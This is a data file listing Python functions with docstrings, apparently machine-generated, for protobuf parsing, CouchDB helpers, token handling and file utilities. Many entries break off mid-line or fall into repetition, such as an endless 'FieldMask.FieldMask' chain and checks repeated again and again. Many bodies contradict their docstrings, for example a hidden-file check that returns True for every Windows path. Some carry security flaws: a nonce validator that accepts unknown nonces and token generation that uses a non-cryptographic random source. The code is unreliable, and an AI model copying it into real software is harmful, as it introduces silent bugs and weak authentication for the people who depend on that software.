        "def AddEnumDescriptor(self, enum_desc):\n    \"\"\"Adds an EnumDescriptor to the pool.\n\n    This method also registers the FileDescriptor associated with the message.\n\n    Args:\n      enum_desc: An EnumDescriptor.\n    \"\"\"\n    self._enum_descriptors.Add(enum_desc)\n    self._enum_descriptors_by_file_descriptor.Add(enum_desc.file_descriptor)",
        "def GetFileContainingSymbol(self, symbol):\n    \"\"\"Gets the FileDescriptor for the file containing the specified symbol.\n\n    Args:\n      symbol: The name of the symbol to search for.\n\n    Returns:\n      A FileDescriptor that contains the specified symbol.\n\n    Raises:\n      KeyError: if the file can not be found in the pool.\n    \"\"\"\n    with self._mutex:\n      for file_descriptor in self._files:\n        if file_descriptor.symbol == symbol:\n          return file_descriptor\n      raise KeyError('File %s does not exist' % symbol)",
        "def LoadNamedDescriptor(self, full_name):\n    \"\"\"Loads the named descriptor from the pool.\n\n    Args:\n      full_name: The full name of the descriptor to load.\n\n    Returns:\n      The descriptor for the named type.\n    \"\"\"\n    descriptor = self._descriptors.get(full_name)\n    if descriptor is None:\n      descriptor = self._CreateDescriptor(full_name)\n      self._descriptors[full_name] = descriptor\n    return descriptor",
        "def _LoadNamedType(self, full_name):\n    \"\"\"Loads the named enum descriptor from the pool.\n\n    Args:\n      full_name: The full name of the enum descriptor to load.\n\n    Returns:\n      The enum descriptor for the named type.\n    \"\"\"\n    name = full_name.split('.')[0]\n    try:\n      return self._enum_descriptors[name]\n    except KeyError:\n      raise errors.NoSuchEnum(full_name)",
        "def _LoadExtensionDescriptor(self, full_name):\n    \"\"\"Loads the named extension descriptor from the pool.\n\n    Args:\n      full_name: The full name of the extension descriptor to load.\n\n    Returns:\n      A FieldDescriptor, describing the named extension.\n    \"\"\"\n    full_name = self._NormalizeFullName(full_name)\n    try:\n      return self._extension_descriptors_by_full_name[full_name]\n    except KeyError:\n      pass\n\n    extension_descriptor = self._pool.FindExtensionByName(full_name)\n    if extension_descriptor is None:\n      raise errors.ExtensionNotFound(full_name)\n\n    self._extension_descriptors_by_full_name[full_name] = extension_descriptor\n    return extension_descriptor",
        "def _MakeEnumDescriptor(self, enum_proto, package=None, file_desc=None,\n                            containing_type=None, scope=None):\n    \"\"\"Make a protobuf EnumDescriptor given an EnumDescriptorProto protobuf.\n\n    Args:\n      enum_proto: The descriptor_pb2.EnumDescriptorProto protobuf message.\n      package: Optional package name for the new message EnumDescriptor.\n      file_desc: The file containing the enum descriptor.\n      containing_type: The type containing this enum.\n      scope: Scope containing available types.\n\n    Returns:\n      The added descriptor\n    \"\"\"\n    enum_name = enum_proto.name\n    enum_descriptor = descriptor_pb2.EnumDescriptor()\n    enum_descriptor.name = enum_name\n    enum_descriptor.number = enum_proto.number\n    enum_descriptor.options = enum_proto.options\n    if containing_",
        "def _from_proto(cls, field_proto, message_name, index, is_extension):\n    \"\"\"Creates a field descriptor from a FieldDescriptorProto.\n\n    For message and enum type fields, this method will do a look up\n    in the pool for the appropriate descriptor for that type. If it\n    is unavailable, it will fall back to the _source function to\n    create it. If this type is still unavailable, construction will\n    fail.\n\n    Args:\n      field_proto: The proto describing the field.\n      message_name: The name of the containing message.\n      index: Index of the field\n      is_extension: Indication that this field is for an extension.\n\n    Returns:\n      An initialized FieldDescriptor object\n    \"\"\"\n    if is_extension:\n      extension_type = field_proto.type\n    else:\n      extension_type = field_proto.",
        "def get_tm_session(session_factory, manager):\n    \"\"\"Get a ``sqlalchemy.orm.Session`` instance backed by a transaction.\n\n    This function will hook the session to the transaction manager which\n    will take care of committing any changes.\n\n    - When using pyramid_tm it will automatically be committed or aborted\n      depending on whether an exception is raised.\n\n    - When using scripts you should wrap the session in a manager yourself.\n      For example::\n\n          import transaction\n\n          engine = get_engine(settings)\n          session_factory = get_session_factory(engine)\n          with transaction.manager:\n              dbsession = get_tm_session(session_factory, transaction.manager)\n\n    \"\"\"\n    session = session_factory()\n    try:\n        yield session\n    finally:\n        if manager:\n            manager.commit()",
        "def random_string(length):\n    \"\"\"Generate a random string of the specified length.\n\n    The returned string is composed of an alphabet that shouldn't include any\n    characters that are easily mistakeable for one another (I, 1, O, 0), and\n    hopefully won't accidentally contain any English-language curse words.\n    \"\"\"\n    alphabet = string.ascii_letters + string.digits\n    return ''.join(random.choice(alphabet) for _ in range(length))",
        "def _validate_field(self, field, data_type):\n        \"\"\"Require that the named `field` has the right `data_type`\"\"\"\n        if field not in self.fields:\n            raise ValueError(\n                \"Field %s is not a valid field of %s\" % (field, self.name)\n            )\n        if not isinstance(self.fields[field], data_type):\n            raise ValueError(\n                \"Field %s is not of type %s\" % (field, data_type.__name__)\n            )",
        "def flush(self):\n        \"\"\"\n        Forces a flush from the internal queue to the server\n        \"\"\"\n        if self.queue:\n            self.queue.flush()\n            self.queue = None",
        "def decompress(self, stream):\n        \"\"\"Use all decompressor possible to make the stream\"\"\"\n        if self.decompressor is None:\n            return stream\n        return self.decompressor(stream)",
        "def manage(ctx, name, force):\n    \"\"\"Manage a Marv site\"\"\"\n    ctx.obj = MarvSite(name, force)\n    ctx.obj.manage()",
        "def _message_set_item_decoder(extensions_by_number):\n  \"\"\"Returns a decoder for a MessageSet item.\n\n  The parameter is the _extensions_by_number map for the message class.\n\n  The message set message looks like this:\n    message MessageSet {\n      repeated group Item = 1 {\n        required int32 type_id = 2;\n        required string message = 3;\n      }\n    }\n  \"\"\"\n  def _message_set_item_decoder_wrapper(message):\n    item = message.group(1)\n    if item is None:\n      return None\n    return _message_by_number.get(item.type_id, _message_by_number.get(item.message, _message_by_number.get(item.message, _message_by_number.get(item.message, _message_by",
        "def get_applicaiton_name(app):\n    \"\"\"\n    Flask like implementation of getting the applicaiton name via\n    the filename of the including file\n    \"\"\"\n    if app.config.get('APplicaiton_NAME'):\n        return app.config['APplicaiton_NAME']\n    if app.config.get('APplicaiton_INCLUDE'):\n        return os.path.basename(app.config['APplicaiton_INCLUDE'])\n    return app.name",
        "def get_function(self, name):\n        \"\"\"Given a Python function name, return the function it refers to.\"\"\"\n        if name in self.functions:\n            return self.functions[name]\n        else:\n            raise ValueError(\"Function %s not found\" % name)",
        "def add_function(self, function):\n        \"\"\"Add a function to the function list, in order.\"\"\"\n        if function not in self.functions:\n            self.functions.append(function)",
        "def _get_mapping(self, doc):\n        \"\"\"Return the mapping of a document according to the function list.\"\"\"\n        if self.function_list:\n            return {\n                key: value\n                for key, value in doc.items()\n                if key in self.function_list\n            }\n        return doc",
        "def reduce_by_function(self, reduce_func, *reduce_args, **reduce_kwargs):\n        \"\"\"Reduce several mapped documents by several reduction functions.\"\"\"\n        return self.reduce_by_function_and_args(reduce_func, reduce_args, **reduce_kwargs)",
        "def reduce(values, func_list):\n    \"\"\"Re-reduce a set of values, with a list of rereduction functions.\"\"\"\n    return reduce_with_func_list(values, func_list, lambda x: x)",
        "def validate_doc(self, doc):\n        \"\"\"Validate...this function is undocumented, but still in CouchDB.\"\"\"\n        if not doc:\n            return\n        if not isinstance(doc, dict):\n            raise TypeError(\"doc must be a dict\")\n        for key in doc:\n            if key not in self.fields:\n                raise ValueError(\"Unknown field %s\" % key)\n            if key not in self.indexes:\n                raise ValueError(\"Unknown index %s\" % key)\n            if key not in self.fields_types:\n                raise ValueError(\"Unknown field type %s\" % key)\n            if key not in self.indexes_types:\n                raise ValueError(\"Unknown index type %s\" % key)\n            if key not in self.fields_types:\n                raise ValueError(\"Unknown field type %s\" % key)\n            if key not in self.indexes_",
        "def handle_request(self, request):\n        \"\"\"The main function called to handle a request.\"\"\"\n        # Get the request method\n        method = request.method\n        # Get the request URI\n        uri = request.path\n        # Get the request headers\n        headers = request.headers\n        # Get the request body\n        body = request.body\n        # Check if the request is a POST request\n        if method == 'POST':\n            # Create the response object\n            response = self.create_response(request, body)\n            # Send the response\n            self.send_response(response.code)\n            self.send_header('Content-Length', str(len(response.body)))\n            self.end_headers()\n            # Send the response\n            self.wfile.write(response.body)\n        # Check if the request is a PUT request\n        elif method ==",
        "def log(self, event):\n        \"\"\"Log an event on the CouchDB server.\"\"\"\n        if self.log_level == 'debug':\n            self.log_debug(event)\n        elif self.log_level == 'info':\n            self.log_info(event)\n        elif self.log_level == 'warning':\n            self.log_warning(event)\n        elif self.log_level == 'error':\n            self.log_error(event)",
        "def generate_id(prefix=None, suffix=None):\n    \"\"\"\n    Generates a universally unique ID.\n    Any arguments only create more randomness.\n    \"\"\"\n    if prefix is None:\n        prefix = ''\n    if suffix is None:\n        suffix = ''\n    return prefix + str(uuid.uuid4()) + suffix",
        "def revoke_token(self, access_token):\n        \"\"\"revoke_token removes the access token from the data_store\"\"\"\n        if access_token:\n            self.data_store.revoke_token(access_token)\n            self.logger.info('Token revoked')",
        "def _auth(self, nonce, client_id, client_secret):\n        \"\"\"\n        _auth - internal method to ensure the client_id and client_secret passed with\n        the nonce match\n        \"\"\"\n        if nonce != self.nonce:\n            raise ValueError(\"Nonce mismatch\")\n        if client_id != self.client_id:\n            raise ValueError(\"Client ID mismatch\")\n        if client_secret != self.client_secret:\n            raise ValueError(\"Client secret mismatch\")",
        "def _validate_request_code(self, nonce):\n        '''\n        _validate_request_code - internal method for verifying the the given nonce.\n        also removes the nonce from the data_store, as they are intended for\n        one-time use.\n        '''\n        if nonce in self.request_code_cache:\n            self.request_code_cache.remove(nonce)\n        else:\n            self.request_code_cache.append(nonce)",
        "def _generate_token(self, length):\n        '''\n        _generate_token - internal function for generating randomized alphanumberic\n        strings of a given length\n        '''\n        return ''.join(random.choice(string.ascii_uppercase + string.digits)\n                       for _ in range(length))",
        "def merge_ordered(self, *args):\n        \"\"\"Merge multiple ordered so that within-ordered order is preserved\"\"\"\n        if len(args) == 1:\n            return args[0]\n        else:\n            return self.merge(*args, key=lambda x: x.order)",
        "def validate_params(valid_options, params):\n    \"\"\"Helps us validate the parameters for the request\n\n    :param valid_options: a list of strings of valid options for the\n                          api request\n    :param params: a dict, the key-value store which we really only care about\n                   the key which has tells us what the user is using for the\n                   API request\n\n    :returns: None or throws an exception if the validation fails\n    \"\"\"\n    for option in valid_options:\n        if option not in params:\n            raise ValueError(\"Invalid option: %s\" % option)",
        "def get_datetime(self):\n        \"\"\"Get current datetime for every file.\"\"\"\n        return [\n            self.get_datetime_by_file(f)\n            for f in self.get_files()\n        ]",
        "def run(self):\n        \"\"\"\n        run your main spider here\n        as for branch spider result data, you can return everything or do whatever with it\n        in your own code\n\n        :return: None\n        \"\"\"\n        self.log.info(\"starting spider\")\n        self.spider.run()\n        self.log.info(\"finished spider\")",
        "def read_version_info(filename):\n    \"\"\"Read version info from a file without importing it\"\"\"\n    with open(filename, 'r') as f:\n        for line in f:\n            if line.startswith('__version__'):\n                return line.split('__')[1].strip()",
        "def _MakeDescriptor(desc_proto, package=None, build_file_if_cpp=True,\n                      syntax=\"proto3\"):\n  \"\"\"Make a protobuf Descriptor given a DescriptorProto protobuf.\n\n  Handles nested descriptors. Note that this is limited to the scope of defining\n  a message inside of another message. Composite fields can currently only be\n  resolved if the message is defined in the same scope as the field.\n\n  Args:\n    desc_proto: The descriptor_pb2.DescriptorProto protobuf message.\n    package: Optional package name for the new message Descriptor (string).\n    build_file_if_cpp: Update the C++ descriptor pool if api matches.\n                       Set to False on recursion, so no duplicates are created.\n    syntax: The syntax/semantics that should be used.  Set to \"proto3\" to get\n            proto3 field presence semantics.\n  Returns:",
        "def root(self):\n        \"\"\"Returns the root if this is a nested type, or itself if its the root.\"\"\"\n        if self.is_root:\n            return self\n        else:\n            return self.parent",
        "def _find_method_descriptor(self, method_name):\n        \"\"\"Searches for the specified method, and returns its descriptor.\"\"\"\n        for method_descriptor in self._method_descriptors:\n            if method_descriptor.name == method_name:\n                return method_descriptor\n        raise ValueError(\"No method with name %s\" % method_name)",
        "def _SerializeMessage(message, including_default_value_fields=False):\n  \"\"\"Converts protobuf message to JSON format.\n\n  Args:\n    message: The protocol buffers message instance to serialize.\n    including_default_value_fields: If True, singular primitive fields,\n        repeated fields, and map fields will always be serialized.  If\n        False, only serialize non-empty fields.  Singular message fields\n        and oneof fields are not affected by this option.\n\n  Returns:\n    A string containing the JSON formatted protocol buffer message.\n  \"\"\"\n  if including_default_value_fields:\n    return _SerializeDefaultValueFields(message)\n\n  serialized_message = _SerializeMessageFields(message)\n  return json.dumps(serialized_message)",
        "def _message_to_object(message):\n  \"\"\"Converts message to an object according to Proto3 JSON Specification.\"\"\"\n  if isinstance(message, dict):\n    return {k: _message_to_object(v) for k, v in message.items()}\n  elif isinstance(message, list):\n    return [_message_to_object(v) for v in message]\n  else:\n    return message",
        "def _ConvertStruct(self, message):\n    \"\"\"Converts Struct message according to Proto3 JSON Specification.\"\"\"\n    result = {}\n    for field_number, field in enumerate(message.fields):\n      field_type = field.type\n      if field_type == FieldDescriptor.TYPE_MESSAGE:\n        result[field_number] = self._ConvertMessage(field)\n      elif field_type == FieldDescriptor.TYPE_ENUM:\n        result[field_number] = self._ConvertEnum(field)\n      elif field_type == FieldDescriptor.TYPE_MESSAGE:\n        result[field_number] = self._ConvertMessage(field)\n      elif field_type == FieldDescriptor.TYPE_ENUM:\n        result[field_number] = self._ConvertEnum(field)\n      else:\n        raise ValueError(\"Unknown field type: %s\" % field_type)\n    return result",
        "def ParseMessage(text, message):\n  \"\"\"Parses a JSON representation of a protocol message into a message.\n\n  Args:\n    text: Message JSON representation.\n    message: A protocol beffer message to merge into.\n\n  Returns:\n    The same message passed as argument.\n\n  Raises::\n    ParseError: On JSON parsing problems.\n  \"\"\"\n  try:\n    message.ParseFromString(text)\n  except json.JSONDecodeError as e:\n    raise ParseError(\n        'Unable to parse message: %s. %s' % (text, e))\n  return message",
        "def _ConvertFieldValues(js, message):\n  \"\"\"Convert field value pairs into regular message.\n\n  Args:\n    js: A JSON object to convert the field value pairs.\n    message: A regular protocol message to record the data.\n\n  Raises:\n    ParseError: In case of problems converting.\n  \"\"\"\n  for key, value in js.items():\n    if isinstance(value, dict):\n      _ConvertFieldValues(value, message.add())\n    elif isinstance(value, list):\n      message.add().CopyFrom(value)\n    else:\n      message.add().CopyFrom(value)",
        "def _ConvertMessage(value, message):\n  \"\"\"Convert a JSON object into a message.\n\n  Args:\n    value: A JSON object.\n    message: A WKT or regular protocol message to record the data.\n\n  Raises:\n    ParseError: In case of convert problems.\n  \"\"\"\n  if isinstance(value, dict):\n    for key, value in value.items():\n      _ConvertMessage(value, message)\n  elif isinstance(value, list):\n    for item in value:\n      _ConvertMessage(item, message)\n  elif isinstance(value, str):\n    message.data.append(value)\n  else:\n    raise ParseError(\"Invalid value: %s\" % value)",
        "def _from_json(cls, value_json):\n        \"\"\"Convert a JSON representation into Value message.\"\"\"\n        value = cls()\n        value.value = value_json['value']\n        value.type = value_json['type']\n        value.description = value_json['description']\n        return value",
        "def _from_json(cls, json_value):\n        \"\"\"Convert a JSON representation into ListValue message.\"\"\"\n        if isinstance(json_value, dict):\n            return cls(\n                value=json_value.get('value', []),\n                label=json_value.get('label', None),\n                description=json_value.get('description', None),\n                type=json_value.get('type', None),\n            )\n        else:\n            return cls(value=json_value)",
        "def _json_to_struct(json_data):\n    \"\"\"Convert a JSON representation into Struct message.\"\"\"\n    message = _Struct()\n    for field in _JSON_FIELDS:\n        value = json_data.get(field)\n        if value is not None:\n            message.fields[field] = _json_to_message(value)\n    return message",
        "def update_config(self, config):\n        \"\"\"Update config options with the provided dictionary of options.\"\"\"\n        for key, value in config.items():\n            if key in self.config:\n                self.config[key] = value",
        "def _update_counter(self):\n        \"\"\"Completes measuring time interval and updates counter.\"\"\"\n        if self._counter_start_time is None:\n            return\n        if self._counter_end_time is None:\n            return\n        elapsed_time = self._counter_end_time - self._counter_start_time\n        self._counter_start_time = None\n        self._counter_end_time = None\n        self._counter += elapsed_time",
        "def ToString(self):\n    \"\"\"Converts Duration to string format.\n\n    Returns:\n      A string converted from self. The string format will contains\n      3, 6, or 9 fractional digits depending on the precision required to\n      represent the exact Duration value. For example: \"1s\", \"1.010s\",\n      \"1.000000100s\", \"-3.100s\"\n    \"\"\"\n    if self.precision == 0:\n      return self.value\n    else:\n      return \"%ds%ds%ds%ds\" % (\n          self.value, self.microseconds, self.seconds, self.nanoseconds)",
        "def FromString(cls, value):\n    \"\"\"Converts a string to Duration.\n\n    Args:\n      value: A string to be converted. The string must end with 's'. Any\n          fractional digits (or none) are accepted as long as they fit into\n          precision. For example: \"1s\", \"1.01s\", \"1.0000001s\", \"-3.100s\n\n    Raises:\n      ParseError: On parsing problems.\n    \"\"\"\n    if not value.endswith(\"s\"):\n      raise ParseError(\"Expected string to end with 's', got %s\" % value)\n\n    precision = int(value[:-1])\n    if precision < 0:\n      raise ParseError(\"Expected positive precision, got %s\" % precision)\n\n    return cls(precision)",
        "def _string_to_field_mask(value):\n  \"\"\"Converts string to FieldMask according to proto3 JSON spec.\"\"\"\n  if isinstance(value, six.string_types):\n    return FieldMask.FieldMask(\n        name=value,\n        fields=[FieldMask.FieldMask.FieldMask.FieldMask.FieldMask.FieldMask.FieldMask.FieldMask.FieldMask.FieldMask.FieldMask.FieldMask.FieldMask.FieldMask.FieldMask.FieldMask.FieldMask.FieldMask.FieldMask.FieldMask.FieldMask.FieldMask.FieldMask.FieldMask.FieldMask.FieldMask.FieldMask.FieldMask.FieldMask.FieldMask.FieldMask.FieldMask.FieldMask.FieldMask.FieldMask.FieldMask.FieldMask.FieldMask.FieldMask.FieldMask.FieldMask.FieldMask.FieldMask.FieldMask.FieldMask.FieldMask.FieldMask",
        "def get_document(self, id, revision, database):\n        \"\"\"Return a CouchDB document, given its ID, revision and database name.\"\"\"\n        return self.client.get(self.url + \"/\" + id + \"/\" + revision + \"/\" + database)",
        "def readme():\n    \"\"\"Give reST format README for pypi.\"\"\"\n    with open(os.path.join(os.path.dirname(__file__), 'README.rst')) as f:\n        return f.read()",
        "def remove(self, **kwargs):\n        \"\"\"remove records from collection whose parameters match kwargs\"\"\"\n        for record in self.filter(**kwargs):\n            self.remove_one(record)",
        "def _url(self, *args, **kwargs):\n        \"\"\"Resolve the URL to this point.\n\n        >>> trello = TrelloAPIV1('APIKEY')\n        >>> trello.batch._url\n        '1/batch'\n        >>> trello.boards(board_id='BOARD_ID')._url\n        '1/boards/BOARD_ID'\n        >>> trello.boards(board_id='BOARD_ID')(field='FIELD')._url\n        '1/boards/BOARD_ID/FIELD'\n        >>> trello.boards(board_id='BOARD_ID').cards(filter='FILTER')._url\n        '1/boards/BOARD_ID/cards/FILTER'\n        \"\"\"\n        if self.board_id:\n            return self.boards(",
        "def _make_request(self, method, url, params=None, data=None, headers=None):\n        \"\"\"Makes the HTTP request.\"\"\"\n        if params is None:\n            params = {}\n        if data is None:\n            data = {}\n        if headers is None:\n            headers = {}\n        if self.auth_header:\n            headers[self.auth_header] = self.auth_header\n        if self.auth_token:\n            headers[self.auth_token_header] = self.auth_token\n        if self.auth_token_secret:\n            headers[self.auth_token_secret_header] = self.auth_token_secret\n        if self.auth_token_header:\n            headers[self.auth_token_header] = self.auth_token\n        if self.auth_token_secret:\n            headers[self",
        "def _SkipFieldValue(tokenizer):\n  \"\"\"Skips over a field value.\n\n  Args:\n    tokenizer: A tokenizer to parse the field name and values.\n\n  Raises:\n    ParseError: In case an invalid field value is found.\n  \"\"\"\n  while True:\n    token = tokenizer.Get()\n    if token == _TOKEN_TYPE_COMMA:\n      break\n    elif token == _TOKEN_TYPE_EQUAL:\n      continue\n    elif token == _TOKEN_TYPE_SPACE:\n      raise ParseError(\"Unexpected space in field name.\")\n    else:\n      raise ParseError(\"Unexpected token in field name.\")\n\n  field_name = tokenizer.Get()\n  if field_name == _FIELD_NAME_EMPTY:\n    raise ParseError(\"Unexpected empty field name.\")\n\n  field_value = tokenizer.Get()\n  if field_value == _",
        "def _ParseInteger(text, is_signed=False, is_long=False):\n  \"\"\"Parses an integer.\n\n  Args:\n    text: The text to parse.\n    is_signed: True if a signed integer must be parsed.\n    is_long: True if a long integer must be parsed.\n\n  Returns:\n    The integer value.\n\n  Raises:\n    ValueError: Thrown Iff the text is not a valid integer.\n  \"\"\"\n  if is_signed:\n    return int(text)\n  if is_long:\n    return int(text)\n  raise ValueError(\"Invalid integer: %s\" % text)",
        "def _MessageToText(self, message):\n    \"\"\"Convert protobuf message to text format.\n\n    Args:\n      message: The protocol buffers message.\n    \"\"\"\n    text = []\n    for field in message.DESCRIPTOR.fields:\n      if field.number == 0:\n        continue\n      if field.type == message.FieldDescriptor.TYPE_STRING:\n        text.append(field.name)\n      elif field.type == message.FieldDescriptor.TYPE_INT64:\n        text.append(str(field.number))\n      elif field.type == message.FieldDescriptor.TYPE_FLOAT:\n        text.append(str(field.number))\n      elif field.type == message.FieldDescriptor.TYPE_BOOL:\n        text.append(str(field.number))\n      elif field.type == message.FieldDescriptor.TYPE_ENUM:\n        text.append",
        "def _ParseMessage(self, lines, message):\n    \"\"\"Converts an text representation of a protocol message into a message.\n\n    Args:\n      lines: Lines of a message's text representation.\n      message: A protocol buffer message to merge into.\n\n    Raises:\n      ParseError: On text parsing problems.\n    \"\"\"\n    for line in lines:\n      line = line.strip()\n      if not line:\n        continue\n      if line.startswith('#'):\n        continue\n      if line.startswith('<'):\n        message.message_type = self._ParseMessageType(line[2:])\n        continue\n      if line.startswith('<'):\n        message.message_type = self._ParseMessageType(line[2:])\n        continue\n      if line.startswith('<'):\n        message.message_type = self._ParseMessageType(line",
        "def _MergeScalarField(self, tokenizer, message, field):\n    \"\"\"Merges a single scalar field into a message.\n\n    Args:\n      tokenizer: A tokenizer to parse the field value.\n      message: The message of which field is a member.\n      field: The descriptor of the field to be merged.\n\n    Raises:\n      ParseError: In case of text parsing problems.\n    \"\"\"\n    value = tokenizer.Get()\n    if value is None:\n      return\n\n    if field.type == descriptor.FieldDescriptor.TYPE_MESSAGE:\n      message.Add()\n\n    if field.type == descriptor.FieldDescriptor.TYPE_MESSAGE:\n      message.value = value\n\n    elif field.type == descriptor.FieldDescriptor.TYPE_ENUM:\n      if value in self._EnumValues:\n        message.value = self._EnumValues[value]\n\n    elif field",
        "def _ConsumeIdentifier(self):\n    \"\"\"Consumes protocol message field identifier.\n\n    Returns:\n      Identifier string.\n\n    Raises:\n      ParseError: If an identifier couldn't be consumed.\n    \"\"\"\n    identifier = self._ReadField()\n    if not identifier:\n      raise errors.ParseError('Unexpected end of file.')\n    return identifier",
        "def ConsumeSigned32(self):\n    \"\"\"Consumes a signed 32bit integer number.\n\n    Returns:\n      The integer parsed.\n\n    Raises:\n      ParseError: If a signed 32bit integer couldn't be consumed.\n    \"\"\"\n    signed_value = self.ConsumeSigned64()\n    if signed_value < 0:\n      raise errors.ParseError('Signed 32bit integer too small.')\n    return signed_value",
        "def ConsumeFloat(self):\n    \"\"\"Consumes an floating point number.\n\n    Returns:\n      The number parsed.\n\n    Raises:\n      ParseError: If a floating point number couldn't be consumed.\n    \"\"\"\n    try:\n      return float(self.ConsumeNumber())\n    except ValueError:\n      raise errors.ParseError('Unable to consume float number.')",
        "def ConsumeBoolean(self):\n    \"\"\"Consumes a boolean value.\n\n    Returns:\n      The bool parsed.\n\n    Raises:\n      ParseError: If a boolean value couldn't be consumed.\n    \"\"\"\n    value = self.ConsumeValue()\n    if value is None:\n      return None\n    if value.lower() == 'false':\n      return False\n    if value.lower() == 'true':\n      return True\n    raise errors.ParseError('Invalid boolean value: {0:s}'.format(value))",
        "def ConsumeStringLiteral(self):\n    \"\"\"Consume one token of a string literal.\n\n    String literals (whether bytes or text) can come in multiple adjacent\n    tokens which are automatically concatenated, like in C or Python.  This\n    method only consumes one token.\n\n    Returns:\n      The token parsed.\n    Raises:\n      ParseError: When the wrong format data is found.\n    \"\"\"\n    if self.Peek() != _LITERAL_START:\n      raise ParseError(\"Expected string literal start\")\n\n    if self.Peek() != _LITERAL_END:\n      raise ParseError(\"Expected string literal end\")\n\n    if self.Peek() != _LITERAL_START:\n      raise ParseError(\"Expected string literal start\")\n\n    if self.Peek() != _LITERAL_END:\n      raise ParseError(\"Expected string literal end\")\n\n    if self.Peek() != _LITERAL_START:",
        "def ark_timestamp_to_unix(timestamp):\n    \"\"\"convert ark timestamp to unix timestamp\"\"\"\n    if timestamp is None:\n        return None\n    if isinstance(timestamp, int):\n        return int(timestamp * 1000)\n    if isinstance(timestamp, float):\n        return int(timestamp * 1000)\n    if isinstance(timestamp, str):\n        return int(timestamp)\n    return timestamp",
        "def close(self):\n        \"\"\"Close the connection.\"\"\"\n        if self.sock is not None:\n            self.sock.close()\n            self.sock = None",
        "def _replace_macros(self, content):\n        \"\"\"Replace macros with content defined in the config.\n\n        :param content: Markdown content\n\n        :returns: Markdown content without macros\n        \"\"\"\n        macros = self.config.get('macros', {})\n        for macro in macros:\n            content = content.replace(macro, self.config.get('macros', {}).get(macro))\n        return content",
        "def _make_unique_path(path):\r\n\t\"\"\"Return a pathname possibly with a number appended to it so that it is\r\n\tunique in the directory.\"\"\"\r\n\tif not path:\r\n\t\treturn ''\r\n\tif path[-1] == '/':\r\n\t\tpath = path[:-1]\r\n\treturn path + str(uuid.uuid4())",
        "def append_numbers(filename):\r\n\t\"\"\"Append numbers in sequential order to the filename or folder name\r\n\tNumbers should be appended before the extension on a filename.\"\"\"\r\n\tif not filename.endswith('.txt'):\r\n\t\tfilename += '.txt'\r\n\treturn filename",
        "def splitext(path):\n    \"\"\"Custom version of splitext that doesn't perform splitext on directories\"\"\"\n    if path.startswith('/'):\n        return path[1:].split('/')\n    else:\n        return path.split('/')",
        "def set_modified_time(self, path, mtime):\n        \"\"\"Set the modified time of a file\"\"\"\n        self.set_file_mtime(path, mtime)\n        self.set_file_ctime(path, mtime)",
        "def get_modified_time(path):\n    \"\"\"Get the modified time for a file as a datetime instance\"\"\"\n    try:\n        mtime = os.path.getmtime(path)\n    except OSError:\n        mtime = None\n    return mtime",
        "def ensure_dir(func):\n    \"\"\"wrap a function that returns a dir, making sure it exists\"\"\"\n    @wraps(func)\n    def wrapper(*args, **kwargs):\n        if not os.path.exists(args[0]):\n            os.makedirs(args[0])\n        return func(*args, **kwargs)\n    return wrapper",
        "def is_hidden(path):\r\n\t\"\"\"\r\n\tCheck whether a file is presumed hidden, either because\r\n\tthe pathname starts with dot or because the platform\r\n\tindicates such.\r\n\t\"\"\"\r\n\tif path.startswith('.'):\r\n\t\treturn True\r\n\tif platform.system() == 'Windows':\r\n\t\treturn True\r\n\treturn False",
        "def get_closer(self, line):\n        \"\"\"Get closer to your EOL\"\"\"\n        if line.endswith(self.eol):\n            return line[:-len(self.eol)]\n        return line",
        "def _open_connection(self):\n        \"\"\"Open a connection over the serial line and receive data lines\"\"\"\n        self._serial = serial.Serial(self._port, baudrate=self._baudrate)\n        self._serial.write(self._serial_line)\n        self._serial.flush()\n        self._serial.readline()\n        self._serial.close()",
        "def start(self):\n        \"\"\"create & start main thread\n\n        :return: None\n        \"\"\"\n        self.thread = threading.Thread(target=self.run)\n        self.thread.daemon = True\n        self.thread.start()",
        "def get_text(node):\n    \"\"\"Scans through all children of node and gathers the\n    text. If node has non-text child-nodes then\n    NotTextNodeError is raised.\n    \"\"\"\n    text = []\n    for child in node.childNodes:\n        if child.nodeType == Node.TEXT_NODE:\n            text.append(child.nodeValue)\n    if not text:\n        raise NotTextNodeError(node)\n    return ''.join(text)",
        "def get_credits_remaining(self):\n        \"\"\"Get the number of credits remaining at AmbientSMS\"\"\"\n        if self.sms_status == SMSStatus.PENDING:\n            return 0\n        if self.sms_status == SMSStatus.SENT:\n            return self.sms_data.get('remaining_credits')\n        return 0",
        "def send_mesage(self, message, **kwargs):\n        \"\"\"Send a mesage via the AmbientSMS API server\"\"\"\n        if not self.is_connected():\n            return\n        try:\n            self.send_message(message, **kwargs)\n        except Exception as e:\n            self.log.exception(e)",
        "def send_web_request(self, request):\n        \"\"\"Inteface for sending web requests to the AmbientSMS API Server\"\"\"\n        try:\n            response = self.send_request(request)\n            return response\n        except Exception as e:\n            self.log.exception(e)\n            return False",
        "def _get_file_content(self, f, text):\n        \"\"\"Called for each file\n        Must return file content\n        Can be wrapped\n\n        :type f: static_bundle.files.StaticFileResult\n        :type text: str|unicode\n        :rtype: str|unicode\n        \"\"\"\n        if isinstance(text, unicode):\n            text = text.encode(self.encoding)\n        return text",
        "def is_date(cls):\n        \"\"\"Return True if the class is a date type.\"\"\"\n        return isinstance(cls, (datetime.date, datetime.datetime))",
        "def to_datetime(when):\n    \"\"\"\n    Convert a date or time to a datetime. If when is a date then it sets the time to midnight. If\n    when is a time it sets the date to the epoch. If when is None or a datetime it returns when.\n    Otherwise a TypeError is raised. Returned datetimes have tzinfo set to None unless when is a\n    datetime with tzinfo set in which case it remains the same.\n    \"\"\"\n    if when is None:\n        return datetime.datetime.utcnow()\n    elif isinstance(when, datetime.datetime):\n        return when\n    elif isinstance(when, datetime.date):\n        when = datetime.datetime(when.year, when.month, when.day)\n    elif isinstance(when, datetime.time):\n        when = datetime.datetime(when.hour, when.minute, when.second)\n    else:\n       ",
        "def _convert_to_utc(when, tz):\n    \"\"\"\n    Return a date, time, or datetime converted to a datetime in the given timezone. If when is a\n    datetime and has no timezone it is assumed to be local time. Date and time objects are also\n    assumed to be UTC. The tz value defaults to UTC. Raise TypeError if when cannot be converted to\n    a datetime.\n    \"\"\"\n    if isinstance(when, datetime):\n        if tz is None:\n            return when\n        else:\n            return when.astimezone(pytz.utc)\n    elif isinstance(when, date):\n        if tz is None:\n            return when\n        else:\n            return when.astimezone(pytz.utc)\n    elif isinstance(when, time):\n        if tz is None:\n            return when\n        else:\n            return when.astimezone(",
